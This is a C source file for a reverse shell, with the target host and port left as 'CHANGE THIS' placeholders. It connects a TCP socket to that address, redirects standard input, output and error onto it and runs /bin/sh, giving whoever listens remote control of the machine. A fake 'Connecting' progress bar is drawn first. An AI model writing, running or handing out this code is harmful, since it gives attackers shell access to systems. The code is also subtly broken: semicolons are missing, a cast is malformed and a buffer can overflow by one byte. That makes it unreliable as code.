#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>


void load (const char *host, const int port) {
    char load [32];
    int i = 0;
    while (i <= 34) {
        system("clear");
        if (i > 31) break;
        load[i++] = '%';
        load[i] = '\0';
        printf("\n\n Connecting to connect to %s:%d [%-32s]\n", host, port, load);
        usleep(199900);
    }
    printf("Connected to %s:%d\n", host, port);
}

int main (int argc, char *argv[]) {
    char *host = "127.0.0.1" // CHANGE THIS !
    int port = 1234 // CHANGE THIS !

    load (host, port);
    fflush(stdout);
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr(host);

    connect(sockt, struct(sockaddr *) &revsockaddr, sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char *const arg[] = {"/bin/sh", NULL};
    execve("/bin/sh", arg, NULL);

    printf("Succefully connected to %s:%d\n", host, port);


    return 0;
}